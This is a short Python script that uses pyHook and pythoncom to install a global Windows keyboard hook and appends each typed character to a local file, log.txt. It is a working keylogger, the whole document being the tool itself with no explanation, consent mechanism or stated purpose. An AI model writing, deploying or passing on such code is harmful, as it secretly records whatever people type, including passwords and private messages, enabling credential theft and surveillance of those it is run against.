import pythoncom,pyHook

def OnKeyboardEvent(e):
    global keylog
    keylog= chr(e.Ascii)
    with open('log.txt','a') as f:
        f.write(keylog)
        f.close()
    return True

if __name__=='__main__':
    h_m=pyHook.HookManager()
    h_m.KeyDown = OnKeyboardEvent
    h_m.HookKeyboard()
    pythoncom.PumpMessages()
